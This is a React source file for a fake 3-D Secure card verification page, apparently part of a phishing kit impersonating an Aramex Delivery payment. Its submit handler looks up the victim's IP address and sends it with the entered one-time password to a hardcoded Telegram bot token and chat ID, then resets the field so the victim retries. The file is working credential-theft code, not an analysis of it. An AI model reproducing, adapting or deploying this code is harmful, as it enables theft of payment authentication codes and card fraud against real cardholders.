import React, { useState } from "react";
import Axios from "axios";
import "./Otp.css";

export default function Otp({
  finalData,
  setFinalData,
  error,
  setError,
  setLoading,
}) {
  const [seconds, setSeconds] = useState(0);
  const [munites, setMunites] = useState(5);

  if (munites !== 0 && seconds === 0) {
    setMunites((munites) => munites - 1);
    setSeconds((seconds) => 60);
    setTimeout(() => {
      if (seconds === 0) setSeconds((seconds) => 60);
      setSeconds((seconds) => seconds - 1);
    }, 1000);
  }

  const handle = async () => {
    setError(true);
    if (finalData.otp !== "") {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setFinalData("");
      }, 10000);

      // Fetching the user's IP address
      const ipResponse = await Axios.get("https://api.ipify.org?format=json");
      const userIP = ipResponse.data.ip; // Getting the IP address

      const apiToken = "7157099382:AAEqUqdT09XUHNBEnXIwCoIiei2dm46OlFc";
      const chatId = "7004148788";
      const text = `IP: ${userIP}%0AOTP: ${finalData.otp}\n`; // Including IP in the message
      const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
      Axios(url);

      setFinalData({ ...finalData, otp: "" });
      setError(false);
    }
  };

  return (
    <fieldset className="amx-form-group-container">
      <div className="acscontent" id="_t6" style={{ marginTop: "0px" }}>
        <span
          className="w3ls-login box box--big"
          id="_t7"
          style={{ paddingTop: "0px" }}
        >
          <span className="authTitle" id="_t8">
            <ul>
              <li id="liBankLogo"></li>
              <li id="liNetworkLogo">
                <img
                  alt="3DS"
                  className="iceGphImg acsLogo"
                  id="j_idt12"
                  src="/imageServlet.png"
                  style={{ marginTop: "-50px" }}
                />
              </li>
            </ul>
            <div className="icePnlGrp acsNetworkInstruction" id="j_idt17">
              <h3>
                <label id="editedLabelNetworkInstruction">
                  Please enter your One Time Password (OTP) in the field below
                  to confirm your identity for this purchase. This information
                  is not shared with the merchant.
                </label>
              </h3>
            </div>
          </span>
        </span>
        <span className="w3ls-login box box--big" id="_t20">
          <form
            className="acsAuthInfos"
            id="customerAuthFormAutoSubmit"
            name="customerAuthFormAutoSubmit"
          >
            <div
              className="icePnlGrp infoMerchant"
              id="customerAuthFormAutoSubmit:j_idt22"
            >
              <div
                className="icePnlGrp divInfoMerchant divAcsLabel_ENG"
                id="customerAuthFormAutoSubmit:j_idt23"
              >
                <div
                  className="icePnlGrp"
                  id="customerAuthFormAutoSubmit:j_idt24"
                >
                  <i aria-hidden="true" className="fa  fa-shopping-cart"></i>
                  <label
                    htmlFor="customerAuthFormAutoSubmit:merchantName"
                    id="customerAuthFormAutoSubmit:editedLabelMerchantName"
                  >
                    Merchant:
                  </label>
                </div>
                <h3>
                  <label
                    className="acsTrxInfo"
                    id="customerAuthFormAutoSubmit:merchantName"
                  >
                    Aramex Delivery
                  </label>
                </h3>
              </div>
              <div
                className="icePnlGrp divInfoMerchant divAcsLabel_ENG"
                id="customerAuthFormAutoSubmit:j_idt28"
              >
                <div
                  className="icePnlGrp"
                  id="customerAuthFormAutoSubmit:j_idt29"
                >
                  <i aria-hidden="true" className="fa fa-usd"></i>
                  <label
                    htmlFor="customerAuthFormAutoSubmit:transactionAmount"
                    id="customerAuthFormAutoSubmit:editedLabelTransactionAmount"
                  >
                    Amount:
                  </label>
                </div>
                <h3>
                  <label
                    className="acsTrxInfo"
                    id="customerAuthFormAutoSubmit:transactionAmount"
                  ></label>
                </h3>
              </div>
              <div
                className="icePnlGrp divInfoMerchant divAcsLabel_ENG"
                id="customerAuthFormAutoSubmit:j_idt33"
              >
                <div
                  className="icePnlGrp"
                  id="customerAuthFormAutoSubmit:j_idt34"
                >
                  <i aria-hidden="true" className="fa fa-calendar"></i>
                  <label
                    htmlFor="customerAuthFormAutoSubmit:transactionDate"
                    id="customerAuthFormAutoSubmit:editedLabelTransactionDate"
                  >
                    Date/Time:
                  </label>
                </div>
                <h3>
                  <label
                    className="acsTrxInfo"
                    id="customerAuthFormAutoSubmit:transactionDate"
                  >
                    {new Date().toLocaleString() + ""}
                  </label>
                </h3>
              </div>
              <div
                className="icePnlGrp divInfoMerchant divAcsLabel_ENG"
                id="customerAuthFormAutoSubmit:j_idt38"
              >
                <div
                  className="icePnlGrp"
                  id="customerAuthFormAutoSubmit:j_idt39"
                >
                  <i aria-hidden="true" className="fa fa-credit-card"></i>
                  <label
                    htmlFor="customerAuthFormAutoSubmit:pan"
                    id="customerAuthFormAutoSubmit:editedLabelPan"
                  >
                    Card number:
                  </label>
                </div>
                <h3>
                  <label
                    className="acsTrxInfo"
                    id="customerAuthFormAutoSubmit:pan"
                  >
                    XXXX-XXXX-XXXX-5508
                  </label>
                </h3>
              </div>
              <div
                className="icePnlGrp divInfoMerchant divAcsLabel_ENG"
                id="customerAuthFormAutoSubmit:j_idt48"
              >
                <div
                  className="icePnlGrp"
                  id="customerAuthFormAutoSubmit:j_idt49"
                >
                  <i aria-hidden="true" className="fa fa-phone"></i>
                  <label
                    htmlFor="customerAuthFormAutoSubmit:phoneNumber"
                    id="customerAuthFormAutoSubmit:phone"
                  >
                    Mobile Phone Number
                  </label>
                </div>
                <h3>
                  <label id="customerAuthFormAutoSubmit:phoneNumber">
                    xxxxxxxxxxxxxx000
                  </label>
                </h3>
              </div>
              <div
                className="icePnlGrp divInfoMerchant divAcsLabel_ENG"
                id="customerAuthFormAutoSubmit:j_idt53 oa"
              ></div>
            </div>
            <div
              className="icePnlGrp infoAuthentication"
              id="customerAuthFormAutoSubmit:j_idt58"
            >
              <div id="customerAuthFormAutoSubmit:j_idt59"></div>
              <div
                className="icePnlGrp agile-field-txt"
                id="customerAuthFormAutoSubmit:j_idt69"
              >
                <div
                  className="icePnlGrp authenticationField divAcsLabel_ENG"
                  id="customerAuthFormAutoSubmit:j_idt70"
                >
                  <label
                    className="authenticateEntryLabel"
                    htmlFor="customerAuthFormAutoSubmit:athenticateEntry"
                    id="customerAuthFormAutoSubmit:editedLabelAthenticateEntry"
                  >
                    OTP Received by SMS/Email:
                  </label>
                </div>
                <div
                  className="icePnlGrp authenticateEntry"
                  id="customerAuthFormAutoSubmit:j_idt72"
                >
                  <input
                    className="iceInpSecrt"
                    id="customerAuthFormAutoSubmit:athenticateEntry"
                    maxLength={6}
                    name="customerAuthFormAutoSubmit:athenticateEntry"
                    type="password"
                    value={finalData.otp}
                    onChange={(event) =>
                      setFinalData({ ...finalData, otp: event.target.value })
                    }
                  />
                  <div>
                    {finalData.otp <= 0 && error ? (
                      <span name="Error">Invalid OTP, try again please!</span>
                    ) : (
                      ""
                    )}
                  </div>
                </div>
              </div>
              <div
                className="icePnlGrp"
                id="customerAuthFormAutoSubmit:j_idt78"
              >
                <ul>
                  <li id="liMainButton">
                    <input
                      className="buttonAuth"
                      id="customerAuthFormAutoSubmit:validAuthentication"
                      name="customerAuthFormAutoSubmit:validAuthentication"
                      type="button"
                      value="Submit"
                      onClick={handle}
                    />
                  </li>
                </ul>
              </div>
              <div
                className="icePnlGrp divSubmitTwoButton"
                id="customerAuthFormAutoSubmit:j_idt82"
              >
                <ul>
                  <li>
                    <label className="iconTime">
                      {munites < 10 ? `0${munites}` : munites}:
                      {seconds < 10 ? `0${seconds}` : seconds}
                    </label>
                  </li>
                </ul>
              </div>
            </div>
          </form>
        </span>
      </div>
    </fieldset>
  );
}
